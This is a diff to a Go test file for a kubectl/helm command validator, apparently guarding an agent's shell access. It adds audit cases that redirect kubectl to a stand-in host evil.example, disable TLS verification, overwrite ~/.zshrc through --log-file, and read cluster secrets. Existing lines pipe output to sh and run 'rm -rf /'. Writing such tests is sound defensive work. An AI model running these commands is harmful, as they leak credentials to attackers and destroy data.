@@ -61,6 +61,22 @@ func TestCheckCommand(t *testing.T) {
 		"kubectl get pods --watch":                 {err: "streams forever"},
 		"kubectl get pods --watch-only":            {err: "streams forever"},
 		"kubectl -n ns rollout status deploy/x -w": {err: "streams forever"},
+		// Second audit: flag spellings kubectl accepts that the first checks missed.
+		"kubectl --context c get pods -shttps://evil.example":                 {err: "-s"},
+		"kubectl --context c get pods -As https://evil.example":               {err: "-s"},
+		"kubectl --context c get pods -s=https://evil.example":                {err: "-s"},
+		"kubectl --context c get pods --insecure_skip_tls_verify":             {err: "--insecure-skip-tls-verify"},
+		"kubectl --context c get pods --tls_server_name=evil.example":         {err: "--tls-server-name"},
+		"kubectl --context c get pods --client_key=/tmp/k":                    {err: "--client-key"},
+		"kubectl --context c get pods --log_file=/Users/me/.zshrc":            {err: "--log-file"},
+		"kubectl --context c -n ns get pods -l app=svc":                       {}, // -l takes a value: the "s" is part of it
+		"kubectl --context c -n ns logs web-0 -c sidecar":                     {},
+		"kubectl --context c get --raw /api/v1/namespaces/ns/secrets":         {confirm: true},
+		"kubectl --context c -n ns get secret s --template='{{.data}}'":       {confirm: true},
+		"kubectl --context c -n ns get secrets.v1. s -o json":                 {confirm: true},
+		"kubectl --context c -n ns get secret.v1/s '-ojsonpath={.data}'":      {confirm: true},
+		"helm --kube-context c -n ns get manifest web":                        {confirm: true},
+		"kubectl --context c -n ns get pods -o wide --sort-by=.metadata.name": {},
 		// Tokenizer and encoding tricks.
 		"kubectl get pods | sh":          {err: "shell syntax"},
 		"kubectl get pods; rm -rf /":     {err: "shell syntax"},
